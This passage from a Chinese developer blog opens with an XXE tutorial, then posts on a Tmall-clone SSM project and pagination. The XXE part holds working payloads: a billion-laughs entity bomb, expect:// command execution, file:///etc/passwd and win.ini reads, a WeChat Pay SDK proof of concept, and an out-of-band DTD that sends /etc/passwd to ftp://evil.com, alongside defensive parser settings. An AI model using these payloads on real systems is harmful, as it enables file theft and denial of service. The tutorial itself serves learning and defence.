    &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
  ]&gt;
    &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
</code></pre><p>当XML解析器加载这个文档时，他会看到它包含一个包含文本&lol9;的根元素,不过&lol9;是一个定义的实体,扩展包含十个&lol8;的字符串,每个&lol8;是一个定义的实体，扩展为十个&lol7;的字符串。因为许多XML解释器在解析XML文档时倾向于将它的整个结果保存在内存中，所以这个不到1kb的xml文件实际包含10亿个lol,占用几乎3GB的内存，造成DDOS攻击。</p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>PHP环境下,xml命令执行要求php装有expect扩展。该扩展默认没有安装。</p>
<pre><code>&lt;?php 
  $xml = &lt;&lt;&lt;EOF
  &lt;?xml version = &quot;1.0&quot;?&gt;
  &lt;!DOCTYPE ANY [
      &lt;!ENTITY f SYSTEM &quot;except://ls&quot;&gt;
  ]&gt;
  &lt;x&gt;&amp;f;&lt;/x&gt;
  EOF;
  $data = simplexml_load_string($xml);
  print_r($data);
?&gt;
</code></pre><h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><h4 id="微信XXE"><a href="#微信XXE" class="headerlink" title="微信XXE"></a>微信XXE</h4><p>前一阵子非常火的微信支付的XXE<br><strong>漏洞描述</strong>:微信SDK的xmlToMap()方法接收并处理xml数据且支持外部实体解析，所以只要能控制strXml，那么这边就存在XXE漏洞。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.19.27.15-image.png" alt="2019-02-27.19.27.15-image.png"></p>
<p>执行我们的测试代码(读取win.ini文件)<br><strong>Test.java</strong></p>
<pre><code>package com.test;
import java.util.Map;
import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;

public class Test {
    public static void main(String args[]) throws Exception {

        String xmlStr =&quot;&lt;?xml version=&apos;1.0&apos; encoding=&apos;utf-8&apos;?&gt;\r\n&quot; +
                &quot;&lt;!DOCTYPE root [\r\n&quot; +
                &quot;&lt;!ENTITY test SYSTEM &apos;file:///C:/Windows/win.ini&apos;&gt;]&gt;\r\n&quot; +
                &quot;&lt;root&gt;\r\n&quot;+
                &quot;&lt;name&gt;&amp;test;&lt;/name&gt;\r\n&quot; +
                &quot;&lt;/root&gt;&quot;;

        try{
            Map&lt;String,String&gt; test = xmlToMap(xmlStr);
            System.out.println(test);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.18.10.54-image.png" alt="2019-02-27.18.10.54-image.png"></p>
<p>netdoc协议代替file://协议去读取文件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.18.13.15-image.png" alt="2019-02-27.18.13.15-image.png"></p>
<p>修复方案是针对WXPayXmlUtil.java的配置进行了修改。<br>错误配置:        </p>
<pre><code>http://apache.org/xml/features/disallow-doctype-decl false
http://apache.org/xml/features/nonvalidating/load-external-dtd false
http://xml.org/sax/features/external-general-entities true
http://xml.org/sax/features/external-parameter-entities true
</code></pre><p>修复后:</p>
<pre><code>http://apache.org/xml/features/disallow-doctype-decl true  (不能使用DOCTYPE)
http://apache.org/xml/features/nonvalidating/load-external-dtd false (不加载外部DTD文件)
http://xml.org/sax/features/external-general-entities false  //防止外部普通实体            
http://xml.org/sax/features/external-parameter-entities false  //防止外部参数实体
</code></pre><p><strong>复现代码</strong>:</p>
<h3 id="漏洞挖掘中如何快速检测是否存在XXE"><a href="#漏洞挖掘中如何快速检测是否存在XXE" class="headerlink" title="漏洞挖掘中如何快速检测是否存在XXE"></a>漏洞挖掘中如何快速检测是否存在XXE</h3><h4 id="常用检测方法"><a href="#常用检测方法" class="headerlink" title="常用检测方法"></a>常用检测方法</h4><h5 id="首先查看XML是否可以成功解析"><a href="#首先查看XML是否可以成功解析" class="headerlink" title="首先查看XML是否可以成功解析"></a>首先查看XML是否可以成功解析</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  
&lt;!DOCTYPE ANY [  
&lt;!ENTITY name &quot;test1&quot;&gt;]&gt;    
&lt;root&gt;&amp;name;&lt;/root&gt;
</code></pre><p>如果页面输出了test1(可以解析),第二步查看是否支持DTD引用外部实体        </p>
<pre><code>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  
&lt;!DOCTYPE ANY [  
&lt;!ENTITY % name SYSTEM &quot;http://myhost/index.html&quot;&gt;  
%name;  
]&gt;
</code></pre><p>然后在我的服务器上查看日志,如果有目标服务器向我的服务器发送了一条index.html的请求,说明<br>支持引用外部实体,很有可能存在xxe漏洞。            </p>
<h5 id="外部普通实体"><a href="#外部普通实体" class="headerlink" title="外部普通实体"></a>外部普通实体</h5><p>当有回显时，利用file://协议:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
    &lt;!DOCTYPE lltest[
    &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;
]&gt; 
    &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</code></pre><h5 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h5><p>当无回显，使用http协议:        </p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE note[ 
&lt;!ENTITY % lltest SYSTEM &quot;http://myhost:1234/test_xxe&quot;&gt;
%lltest;
]&gt;
</code></pre><p>然后在myhost监听1234端口(dnslog地址也可以),查看是否有http请求        </p>
<h4 id="代码审计XXE"><a href="#代码审计XXE" class="headerlink" title="代码审计XXE"></a>代码审计XXE</h4><p>直接查找关键字:        </p>
<pre><code>javax.xml.parsers.DocumentBuilderFactory;
javax.xml.parsers.SAXParser
javax.xml.transform.TransformerFactory
javax.xml.validation.Validator
javax.xml.validation.SchemaFactory
javax.xml.transform.sax.SAXTransformerFactory
javax.xml.transform.sax.SAXSource
org.xml.sax.XMLReader
org.xml.sax.helpers.XMLReaderFactory
org.dom4j.io.SAXReader
org.jdom.input.SAXBuilder
org.jdom2.input.SAXBuilder
javax.xml.bind.Unmarshaller
javax.xml.xpath.XpathExpression
javax.xml.stream.XMLStreamReader
org.apache.commons.digester3.Digester
…………
</code></pre><h4 id="Json-Content-type-XXE"><a href="#Json-Content-type-XXE" class="headerlink" title="Json Content-type XXE"></a>Json Content-type XXE</h4><p>很多Web与App应用都是基于客户端-服务器交互的Web通信服务,最常见的数据格式就是Json与XML，尽管web服务可能只使用一种格式，但是服务器却可以接收开发人员没有料到的其他数据格式，有可能导致Json节点受到XXE攻击。<br>测试方法很简单,就是将<code>Content-Type: application/json</code>修改为<code>Content-Type: application/xml</code>，数据格式不变，查看是否报错:<br><code>{&quot;errors&quot;:{&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;}}</code><br>可以发现服务器是可以处理xml数据的，于是我们利用这个来进行攻击。<br>payload:    </p>
<pre><code>...
Content-Type: application/xml
...
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;root&gt;
&lt;param1&gt;name&lt;/param1&gt;
&lt;param2&gt;&amp;xxe;&lt;/param2&gt;
&lt;/root&gt;
</code></pre><p>查看是否可以读取敏感文件。                </p>
<h4 id="利用FTP协议获取敏感信息"><a href="#利用FTP协议获取敏感信息" class="headerlink" title="利用FTP协议获取敏感信息"></a>利用FTP协议获取敏感信息</h4><p>利用ftp协议获取服务器信息/内网ip之类的技巧:<br>在攻击者服务器上运行rb脚本(模拟FTP服务器:<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb),监听8080端口。" target="_blank" rel="noopener">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb),监听8080端口。</a><br>然后在web程序那里输入payload:    </p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
   &lt;!ENTITY % asd SYSTEM &quot;http://evil.com/ext.dtd&quot;&gt; 
   %asd; 
   %rrr; 
]&gt;
&lt;a&gt;&lt;/a&gt;
</code></pre><p>ext.dtd</p>
<pre><code>&lt;!ENTITY % b SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &apos;ftp://evil.com:8000/%b;&apos;&gt;&quot;&gt;
</code></pre><p>然后在模拟的FTP服务器上就会收到一些服务器信息/文件内容            </p>
<p>技巧来自:<a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank" rel="noopener">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a>    </p>
<h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><pre><code>&lt;!DOCTYPE :. SYTEM &quot;http://&quot;
&lt;!DOCTYPE :_-_: SYTEM &quot;http://&quot;
&lt;!DOCTYPE {0xdfbf} SYSTEM &quot;http://&quot;
</code></pre><h3 id="XXE如何防御"><a href="#XXE如何防御" class="headerlink" title="XXE如何防御"></a>XXE如何防御</h3><h4 id="禁用外部实体"><a href="#禁用外部实体" class="headerlink" title="禁用外部实体"></a>禁用外部实体</h4><p>不同语言都提供了禁用外部实体的方法            </p>
<pre><code>PHP:
   libxml_disable_entity_loader(true);

JAVA:
    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    dbf.setExpandEntityReferences(false);
    .setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);  几乎可以防御所有xml实体攻击

    如果不能使用DTDs,可以使用以下两项,两项必须同时存在
    .setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false) //防止外部普通实体POC攻击
    .setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false); //防止外部参数实体POC攻击

Python
    from lxml import etree
    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
</code></pre><h4 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h4><p>过滤关键字:<code>&lt;!DOCTYPE 与&lt;EMTITY，或者SYSTEM PUBLIC</code></p>
<p>可能存在被绕过的情况，如（过滤了&lt;EMTITY）Bypass:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE svg SYSTEM &quot;http://vps/xxe.dtd&quot;&gt;
&lt;root&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;/root&gt;
</code></pre><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://xz.aliyun.com/t/122#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/122#toc-4</a><br><a href="https://xz.aliyun.com/t/2249" target="_blank" rel="noopener">https://xz.aliyun.com/t/2249</a><br><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/</a><br><a href="https://xz.aliyun.com/t/2761#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/2761#toc-3</a><br><a href="https://www.freebuf.com/vuls/194112.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/194112.html</a><br><a href="http://www.freebuf.com/vuls/176837.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/176837.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/23/天猫项目实战总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/23/天猫项目实战总结/" itemprop="url">仿天猫(SSM版)_项目总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-23T08:15:41+08:00">
                2019-02-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>断断续续写了有十来天,写这个的目的就是为了熟悉SSM这个框架,很多都参考了how2j的教程,有许多可以改进的地方,后期再维护吧！</p>
</blockquote>
<hr>
<h2 id="项目大概"><a href="#项目大概" class="headerlink" title="项目大概"></a>项目大概</h2><h3 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h3><p>1.表</p>
<table>
<thead>
<tr>
<th>表名</th>
<th>中文含义</th>
<th>介绍</th>
</tr>
</thead>
<tbody>
<tr>
<td>Category</td>
<td>分类表</td>
<td>存放分类信息</td>
</tr>
<tr>
<td>Property</td>
<td>属性表</td>
<td>分类的属性信息</td>
</tr>
<tr>
<td>PropertyValue</td>
<td>属性值表</td>
<td>属性值信息</td>
</tr>
<tr>
<td>Product</td>
<td>产品表</td>
<td>产品信息</td>
</tr>
<tr>
<td>ProductImage</td>
<td>产品图片表</td>
<td>产品图片信息</td>
</tr>
<tr>
<td>Review</td>
<td>评论表</td>
<td>产品的评论信息,评论内容</td>
</tr>
<tr>
<td>User</td>
<td>用户表</td>
<td>用户信息表,用户账号密码</td>
</tr>
<tr>
<td>Order</td>
<td>订单表</td>
<td>订单信息表,含订单号,地址等信息</td>
</tr>
<tr>
<td>OrderItem</td>
<td>订单项表</td>
<td>订单项表,含购买种类,数量</td>
</tr>
</tbody>
</table>
<p>2.表之间的关系            </p>
<p>正确分析表之间的关系:<br>一个分类对应一个多个产品<br>一个产品对应一个分类        所以分类与产品的关系为<strong>一对多</strong>        </p>
<p>上面表的一对多的关系:            </p>
<table>
<thead>
<tr>
<th>一</th>
<th>多</th>
</tr>
</thead>
<tbody>
<tr>
<td>Category-分类</td>
<td>Product-产品</td>
</tr>
<tr>
<td>Category-分类</td>
<td>Property-属性</td>
</tr>
<tr>
<td>Product-产品</td>
<td>Review-评价</td>
</tr>
<tr>
<td>User-用户</td>
<td>Review-评价</td>
</tr>
<tr>
<td>Order-订单</td>
<td>OrderItem-订单项</td>
</tr>
<tr>
<td>Product-产品</td>
<td>OrderItem-订单项</td>
</tr>
<tr>
<td>User-用户</td>
<td>OrderItem-订单项</td>
</tr>
<tr>
<td>User-用户</td>
<td>Order-订单</td>
</tr>
<tr>
<td>Product-产品</td>
<td>ProductImage-产品图片</td>
</tr>
<tr>
<td>Property-属性</td>
<td>PropertyValue-属性值</td>
</tr>
<tr>
<td>Product-产品</td>
<td>PropertyValue-属性值</td>
</tr>
</tbody>
</table>
<h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><p>项目名称tmall_ssm</p>
<pre><code>Java源代码
    controller 控制层        
    interceptor 拦截器            
    mapper Mapper类
    pojo 实体类                
    service Service层            
    util 工具类
    comparator 比较类    
resources
    mapper 映射文件
    配置文件
web目录        
    css
    img
    js
    Web-INF
        views
            admin    后台所用的Jsp文件
            fore    前台的Jsp文件
            include    包含的Jsp文件

pom.xml    Maven配置文件            
</code></pre><h3 id="典型场景"><a href="#典型场景" class="headerlink" title="典型场景"></a>典型场景</h3><pre><code>前台功能:
    用户管理
        会员注册
        会员登陆
        退出登陆
        登陆验证拦截器
    订单管理
        查看订单状态
        付款
        确认收货
        评价订单
        删除
    购物车
        查看购物车
        添加删除
        结算
    产品展示
        搜索产品
        产品详情
        展示产品

后台功能:    
    分类,订单,用户,属性等的CURD操作


其他:
    分页功能                
    事务管理(创建订单时将OrderItem的oid设置为Order表的id值)    
    产品搜索(使用比较器)                
</code></pre><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><pre><code>1.MVC设计模式            
2.MYBATIS逆向工程重构            
3.模块化的Jsp开发(将每个页面拆分成几个小的Jsp页面)    
4.后台所有分页页面使用相同的分页机制(admin_page.jsp)            
</code></pre><p><a href="https://github.com/P0rZ9/tmall_ssm" target="_blank" rel="noopener">源代码</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/12/分页功能详解/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/12/分页功能详解/" itemprop="url">分页知识详解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-12T08:15:41+08:00">
                2019-02-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>分页使用场景:当取到的数据量到达一定程度时,需要使用分页来进行数据分割</p>
</blockquote>
<h4 id="分页分类"><a href="#分页分类" class="headerlink" title="分页分类:"></a>分页分类:</h4><h5 id="a-真分页-物理分页"><a href="#a-真分页-物理分页" class="headerlink" title="a.真分页(物理分页)"></a>a.真分页(物理分页)</h5><pre><code>原理:每次点击下一页时去数据库查询。                
select * from user where id &gt; 1 limit #{param1}, #{param2}    
优点:不会造成内存溢出    
缺点:翻页速度较慢    
</code></pre><h5 id="b-假分页-逻辑分页"><a href="#b-假分页-逻辑分页" class="headerlink" title="b.假分页(逻辑分页)"></a>b.假分页(逻辑分页)</h5><pre><code>原理:一次将所有数据取出放入内存中,每次查询直在内存中取出数据。    优点:分页速度较快            
缺点:可能造成内存溢出                        
</code></pre><p>假分页容易实现,即准备一个集合保存从数据库中取出所有数据,根据当前码数,取出对应范围的数据,我们这里主要学习物理分页。            </p>
<h4 id="实现简单物理分页"><a href="#实现简单物理分页" class="headerlink" title="实现简单物理分页"></a>实现简单物理分页</h4><p>1.准备一个Page工具类:    </p>
<pre><code>public class Page {

  int start;
  int count;
  int total;

  //构造方法
  public Page(int start,int count){
      super();
      this.start = start;
      this.count = count;
  }

  //计算得到尾页
  public int getLast(){
      int last;
      //假设total=50  count=5
      if(total % count == 0)
          //最后一页开头为45
         last = total - count;
      else
          //不整除 最后一页开头为50
          last = total - total % count;

      last = last &lt; 0 ? 0 : last;
      return last;
  }

  //是否有上一页 下一页
  public boolean isHasPreviouse(){
      if (start == 0)
          return false;
      return true;
  }
  public boolean isHasNext(){
      if(getLast() == 0)
          return false;
      return true;
  }

  //计算得到总页数
  public int getTotalPage(){
      int totalPage;

      if(total % count == 0)
          totalPage = total / count;
      else
          totalPage = total / count + 1;
      if(totalPage == 0)
          totalPage = 1;

      return totalPage;
  }

/* getter and setter */
}
</code></pre><p>前台设计:</p>
<pre><code>&lt;ul class=&quot;pagination&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&amp;laquo;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;3&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;4&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&amp;raquo;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-12.10.39.23-image.png" alt="2019-02-12.10.39.23-image.png"></p>
<p>前台分页设计:</p>
<pre><code>&lt;ul class=&quot;pagination&quot;&gt;
    &lt;li&gt;&lt;a href=&quot;?page.start=0&quot;&gt;&lt;span&gt;«&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;?page.start=${page.start-page.count}&quot;&gt;&lt;span&gt;‹&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;

    &lt;c:forEach begin=&quot;0&quot; end=&quot;${page.totalPage-1}&quot; varStatus=&quot;status&quot;&gt;
    &lt;li&gt;
        &lt;a href=&quot;?page.start=${status.index*page.count}&quot; class=&quot;current&quot;&gt;${status.count}&lt;/a&gt;
    &lt;/li&gt;
    &lt;/c:forEach&gt;

    &lt;li&gt;&lt;a href=&quot;?page.start=${page.start+page.count}&quot;&gt;&lt;span&gt;›&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;?page.start=${page.last}&quot;&gt;&lt;span&gt;»&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><p>a.没有边界判断,即在首页仍然可以点击前一页,不符合逻辑<br>b.会显示所有的分页,如果totalPage有100多页,则会全部显示出来,影响美观            </p>
<h4 id="改良版本"><a href="#改良版本" class="headerlink" title="改良版本"></a>改良版本</h4><p>1.写好头与尾:</p>
<pre><code>&lt;nav class=&quot;pageDIV&quot;&gt;
  &lt;ul class=&quot;pagination&quot;&gt;
  .....
  &lt;/ul&gt;
&lt;/nav&gt;
</code></pre><p>2.对<code>« ‹</code>增加边值判断        </p>
<pre><code>&lt;li &lt;c:if test=&quot;${!page.hasPrevious}&quot;&gt;class=&quot;disabled&quot;&lt;/c:if&gt;&gt;
     &lt;a href=&quot;?page.start=0&quot;&gt;
         &lt;span&gt;
             «
         &lt;/span&gt;
     &lt;/a&gt;
 &lt;/li&gt;

 &lt;li &lt;c:if test=&quot;${!page.hasPrevious}&quot;&gt;class=&quot;disabled&quot;&lt;/c:if&gt;&gt;
     &lt;a href=&quot;?page.start=${page.start-page.count}&quot;&gt;
         &lt;span&gt;
             ‹
         &lt;/span&gt;
     &lt;/a&gt;
 &lt;/li&gt;
</code></pre><p>获取JavaBean的属性,只需要.符号就可以操作。<code>${hero.name}</code>就会自动调用其getName()方法。如果属性为boolean类型,就会自动调用isXXX方法。<br>所以使用page.hasPrevious就会自动调用isHasPrevious()方法。<br>并用js对其禁止:</p>
<pre><code>&lt;script&gt;
  $(function () {
      $(&quot;ui.pagination li.disabled a&quot;).click(function () {
          return false;
      });
  });
&lt;/script&gt;
</code></pre><p>3.中间页码的编写    </p>
<pre><code>&lt;c:forEach begin=&quot;0&quot; end=&quot;${page.totalPage-1}&quot; varStatus=&quot;status&quot;&gt;
    &lt;c:if test=&quot;${status.count*page.count-page.start&lt;=30 &amp;&amp; status.count*page.count-page.start&gt;=-10}&quot;&gt;
        &lt;li &lt;c:if test=&quot;${status.index*page.count==page.start}&quot;&gt;class=&quot;disabled&quot;&lt;/c:if&gt;&gt;
            &lt;a href=&quot;?page.start=${status.index*page.count}&quot;
               &lt;c:if test=&quot;${status.index*page.count==page.start}&quot;&gt;class=&quot;current&quot;&lt;/c:if&gt;
            &gt;${status.count}&lt;/a&gt;
        &lt;/li&gt;
    &lt;/c:if&gt;
&lt;/c:forEach&gt;
</code></pre><p>从0循环到<code>page.totalPage-1</code>,varStatus相当于循环变量<br>status.count是从1开始遍历<br>status.index是从0开始遍历<br>要求:显示页码的前2个与后2个即可,即在第3页时,显示<code>1,2,3,4,5</code>的页码<br>测试条件:-10&lt;当前页*每页显示数目-当前页开始编号&lt;=30<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-12.13.29.28-image.png" alt="2019-02-12.13.29.28-image.png"></p>
<p>4.后台实现分页<br>使用上面的Page工具类,我们在dao层定义一个<code>List&lt;User&gt; list(int start, int count);</code>方法,经过Mapper映射</p>
<pre><code>&lt;select id=&quot;list&quot; resultMap=&quot;students&quot;&gt;
    select * from user order by user_id desc limit #{param1}, #{param2}
&lt;/select&gt;
</code></pre><p>然后在controller中:</p>
<pre><code>// 获取分页参数
int start = 0;
int count = 10;

try {
    start = Integer.parseInt(request.getParameter(&quot;page.start&quot;));
    count = Integer.parseInt(request.getParameter(&quot;page.count&quot;));
} catch (Exception e) {
}
Page page = new Page(start, count);

List&lt;User&gt; users = userService.list(page.getStart(), page.getCount());
int total = userService.getTotal();
page.setTotal(total);
request.setAttribute(&quot;users&quot;, users);
request.setAttribute(&quot;page&quot;, page);

return &quot;listUser&quot;;
</code></pre><p>即可完成分页功能        </p>
<h4 id="SSM项目中的分页"><a href="#SSM项目中的分页" class="headerlink" title="SSM项目中的分页"></a>SSM项目中的分页</h4><p>在SSM项目中,我们可以使用MyBatis的一款分页插件<br><a href="https://github.com/pagehelper/Mybatis-PageHelper" target="_blank" rel="noopener">PageHelper</a><br><strong>使用方法:</strong><br>1.pom.xml添加依赖包        </p>
<pre><code>&lt;!-- pageHelper --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;
    &lt;artifactId&gt;pagehelper&lt;/artifactId&gt;
    &lt;version&gt;5.1.2-beta&lt;/version&gt;
&lt;/dependency&gt;

&lt;!--jsqlparser--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.github.jsqlparser&lt;/groupId&gt;
    &lt;artifactId&gt;jsqlparser&lt;/artifactId&gt;
    &lt;version&gt;1.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre><p>2.spring-mybatis.xml配置文件</p>
<pre><code>&lt;!-- 配置SqlSessionFactory对象 --&gt;
&lt;bean&gt;
......
    &lt;property name=&quot;plugins&quot;&gt;
        &lt;array&gt;
            &lt;bean class=&quot;com.github.pagehelper.PageInterceptor&quot;&gt;
                &lt;property name=&quot;properties&quot;&gt;
                    &lt;!-- config params as the following --&gt;
                    &lt;value&gt;
                        helperDialect=mysql
                    &lt;/value&gt;
                &lt;/property&gt;
            &lt;/bean&gt;
        &lt;/array&gt;
    &lt;/property&gt;
&lt;/bean&gt;
</code></pre><p>3.UserController:</p>
<pre><code>PageHelper.offsetPage(page.getStart(),page.getCount());
List&lt;User&gt; users = userService.list();
int total = (int) new PageInfo&lt;&gt;(users).getTotal();
page.setTotal(total);
modelMap.addAttribute(&quot;page&quot;,page);
modelMap.addAttribute(&quot;users&quot;,users);
</code></pre><p>需要注意的是:<code>PageHelper.offsetPage(page.getStart(),page.getCount);只对该语句以后的第一个查询语句得到的数据进行分页</code>,所以这句话应该放在得到users前面。                </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/25/ssm整合/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/25/ssm整合/" itemprop="url">ssm整合</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
